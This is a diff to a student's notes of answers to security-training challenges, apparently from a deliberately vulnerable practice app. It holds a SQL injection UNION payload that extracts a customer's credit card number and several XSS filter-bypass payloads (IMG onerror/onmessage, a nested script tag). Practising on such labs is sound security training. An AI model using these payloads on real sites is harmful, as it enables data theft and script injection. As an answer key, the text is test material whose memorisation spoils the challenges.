@@ -29,3 +29,18 @@ Please enter the Customer Email of the user that you want to look up:
 
 4) To complete this challenge, you must exploit a SQL injection issue in the following sub application to acquire the credit card number from one of the customers that has a customer name of Mary Martin. Mary's credit card number is the result key to this challenge.
 ``` SELECT customerName from customers where customerName='Mary MArtin' Union select CreditCardNumber from customers where customerName="mary martin"; # ```
+
+## Week 3
+Cross Site Scripting One
+
+1) Find a XSS vulnerability in the following form. It would appear that your input is been filtered!
+Please enter the Search Term that you want to look up 
+```<IMG SRC="#" ONERROR="alert('XSS')"/>```
+
+2)  Find a XSS vulnerability in the following form. It would appear that your input is been filtered!
+Please enter the Search Term that you want to look up 
+```<IMG SRC="#" ONMESSAGE="alert('XSS')"/>```
+
+3) In this one, the developer is completely removing the handler name. 
+``` <SCRonmessageIPT>alert('XSS')</SCRonmessageIPT>```
+
